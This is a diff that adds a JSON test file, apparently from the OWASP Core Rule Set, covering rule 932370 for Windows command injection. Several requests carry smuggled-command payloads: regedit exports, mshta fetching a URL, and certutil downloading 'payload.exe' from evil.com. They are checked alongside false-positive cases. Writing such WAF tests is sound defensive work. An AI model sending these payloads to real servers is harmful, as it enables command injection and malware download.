@@ -1,0 +1,231 @@
+[
+  {
+    "name": "CRS 932370-1: Windows Command Injection true positive test",
+    "method": "GET",
+    "uri": "/get?cmd%3D%3B%20regedit%20%2FE%20c%3A%5Cads%5Cfile.txt%3Aregfile.reg%20HKEY_CURRENT_USER%5CMyCustomRegKey",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-2: Windows Command Injection true negative test",
+    "method": "GET",
+    "uri": "/get?cmd=regedit%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-3: Windows Command Injection - bypass test",
+    "method": "GET",
+    "uri": "/get?cmd=;%20mshta%20http://example.com",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-4: Windows Command Injection bypass with time negative test",
+    "method": "GET",
+    "uri": "/get?foo=time+warner+",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Accept-Encoding",
+        "gzip, deflate, br"
+      ],
+      [
+        "Accept-Language",
+        "en-us,en;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-5: False positive: matching `at` after newline",
+    "method": "GET",
+    "uri": "/get?cmd=Go%20to%20store.%0AAt%20the%20store%2C%20shop.",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-6: False positive: 'url' as a parameter name should not trigger",
+    "method": "GET",
+    "uri": "/page?url=https://example.com",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-7: Windows Command Injection with certutil",
+    "method": "GET",
+    "uri": "/get?cmd=%3B%20certutil%20-urlcache%20-f%20http%3A%2F%2Fevil.com%2Fpayload.exe",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      932370
+    ]
+  },
+  {
+    "name": "CRS 932370-8: GHSA: 932370 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "127"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\"cmd=; regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\"></a></root>",
+    "expect_ids": [
+      932370
+    ]
+  }
+]
